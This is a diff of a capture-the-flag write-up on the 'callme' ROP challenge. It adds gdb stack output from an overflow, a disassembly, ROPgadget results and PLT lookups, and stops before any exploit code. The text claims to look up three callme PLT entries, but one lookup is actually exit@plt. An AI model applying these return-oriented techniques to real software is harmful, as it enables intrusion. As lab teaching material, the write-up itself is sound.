@@ -58,7 +58,9 @@ The read function in pwnme() expects 512 bytes even tho the local_28 variable is
 
 # Dynamic analysis
 
-Let's find out how many bytes we need to send to modify the return address :
+Using gdb, we'll find out how many bytes we need to send to modify the return address.  
+  
+Let's take a look at the stack after we've send 32 bytes :
 
 ```gdb
 gef➤  r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*32)')
@@ -75,3 +77,61 @@ gef➤  r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*32)')
 0x00007fffffffda40│+0x0030: 0x0000000000000001
 0x00007fffffffda48│+0x0038: 0x00007ffff7a456ca  →  <__libc_start_call_main+007a> mov edi, eax
 ```
+
+The rbp is stored right after our input on the stack. Now let's take a look at the usefulFunction() we'll need to call :
+
+```gdb
+gef➤  disas usefulFunction 
+Dump of assembler code for function usefulFunction:
+   0x00000000004008f2 <+0>:	push   rbp
+   0x00000000004008f3 <+1>:	mov    rbp,rsp
+   0x00000000004008f6 <+4>:	mov    edx,0x6
+   0x00000000004008fb <+9>:	mov    esi,0x5
+   0x0000000000400900 <+14>:	mov    edi,0x4
+   0x0000000000400905 <+19>:	call   0x4006f0 <callme_three@plt>
+   0x000000000040090a <+24>:	mov    edx,0x6
+   0x000000000040090f <+29>:	mov    esi,0x5
+   0x0000000000400914 <+34>:	mov    edi,0x4
+   0x0000000000400919 <+39>:	call   0x400740 <callme_two@plt>
+   0x000000000040091e <+44>:	mov    edx,0x6
+   0x0000000000400923 <+49>:	mov    esi,0x5
+   0x0000000000400928 <+54>:	mov    edi,0x4
+   0x000000000040092d <+59>:	call   0x400720 <callme_one@plt>
+   0x0000000000400932 <+64>:	mov    edi,0x1
+   0x0000000000400937 <+69>:	call   0x400750 <exit@plt>
+End of assembler dump.
+```
+
+We can see that the arguments used to call the functions are stored in edi, esi and edx. We'll need some gadgets to modify those :
+
+```console
+$ ROPgadget --binary callme | grep rdi
+0x0000000000400a3d : add byte ptr [rax], al ; add byte ptr [rbp + rdi*8 - 1], ch ; call qword ptr [rax + 0x23000000]
+0x0000000000400a3f : add byte ptr [rbp + rdi*8 - 1], ch ; call qword ptr [rax + 0x23000000]
+0x0000000000400a3c : add byte ptr fs:[rax], al ; add byte ptr [rbp + rdi*8 - 1], ch ; call qword ptr [rax + 0x23000000]
+0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
+0x00000000004009a3 : pop rdi ; ret
+```
+
+We found `0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret` which does exactly what we want.
+  
+Our last remaining issue being that we need to call the functions callme_one(), callme_two() and callme_three() in that order. But if we look at the usefulFonction() not only does it not use a `ret` instruction (that we could have exploited), but it also modifies the register before calling those functions in the wrong order.  
+  
+We'll need to bypass this by directly calling the PLT instructions resolving the address to those functions. We can find those pointers in the disassembled code of the usefulFunction() above :
+
+```gdb
+gef➤  x/3i 0x4006f0
+   0x4006f0 <callme_three@plt>:	jmp    QWORD PTR [rip+0x200932]        # 0x601028 <callme_three@got.plt>
+   0x4006f6 <callme_three@plt+6>:	push   0x2
+   0x4006fb <callme_three@plt+11>:	jmp    0x4006c0
+gef➤  x/3i 0x400740
+   0x400740 <callme_two@plt>:	jmp    QWORD PTR [rip+0x20090a]        # 0x601050 <callme_two@got.plt>
+   0x400746 <callme_two@plt+6>:	push   0x7
+   0x40074b <callme_two@plt+11>:	jmp    0x4006c0
+gef➤  x/3i 0x400750
+   0x400750 <exit@plt>:	jmp    QWORD PTR [rip+0x200902]        # 0x601058 <exit@got.plt>
+   0x400756 <exit@plt+6>:	push   0x8
+   0x40075b <exit@plt+11>:	jmp    0x4006c0
+```
+
+# Exploit
